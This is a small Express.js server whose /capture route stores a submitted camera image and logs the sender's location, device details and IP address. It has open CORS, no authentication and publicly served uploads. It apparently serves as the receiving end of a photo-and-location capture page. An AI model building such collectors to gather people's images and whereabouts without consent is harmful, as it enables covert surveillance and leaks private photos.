const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const cors = require("cors");
const path = require("path");
require("dotenv").config();

const app = express();

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, "uploads");
console.log("Uploads directory:", uploadsDir);
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: "10mb" }));
app.use("/uploads", express.static(uploadsDir));

// API Route to handle image and location
app.post("/capture", (req, res) => {
  const { image, location, deviceInfo, ipAddress } = req.body;

  // Save the image
  const base64Data = image.replace(/^data:image\/png;base64,/, "");
  const filename = path.join(uploadsDir, `user-${Date.now()}.png`);
  fs.writeFileSync(filename, base64Data, "base64");
  console.log("Image saved:", filename);

  // Log location, device info, and IP
  console.log("Location:", location);
  console.log("Device Info:", deviceInfo);
  console.log("IP Address:", ipAddress);

  res.send({ status: "success", message: "Data captured!" });
});


// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
